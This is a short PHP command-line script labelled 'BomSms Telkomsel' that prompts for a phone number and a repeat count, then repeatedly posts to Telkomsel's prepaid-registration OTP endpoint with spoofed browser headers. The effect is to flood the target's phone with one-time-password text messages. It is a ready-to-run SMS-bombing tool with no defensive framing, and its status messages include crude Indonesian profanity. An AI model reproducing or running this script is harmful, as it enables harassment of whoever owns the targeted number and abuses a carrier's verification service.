<?php

echo "BomSms Telkomsel\n";
echo "Author : Aryo\n";
echo "Contoh 0821*********\n";
echo "Phone: ";
$no = trim(fgets(STDIN));
echo "Jumlah: ";
$jum = trim(fgets(STDIN));
$i=0;
while($i < $jum)
{
$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://www.telkomsel.com/prepaid_registration/get_otp');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "phone=".$no);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'Accept-Encoding: gzip, deflate, br';
$headers[] = 'Accept-Language: en-US,en;q=0.9';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36';
$headers[] = 'Chrome-Proxy: frfr';
$headers[] = 'Accept: image/webp,image/apng,image/*,*/*;q=0.8';
$headers[] = 'Referer: https://www.telkomsel.com/daftar-ulang-prepaid';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Range: bytes=0-';
$headers[] = 'Origin: https://www.telkomsel.com';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'X-Requested-With: XMLHttpRequest';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);
$datas = json_decode($result);


    	 if($datas->msg == '0'){
 			echo "Gagal y kontol! \n";
 		}else{
 		echo "Berhasil y kontol! \n ";
}

//echo $result."\n";
$i++;
}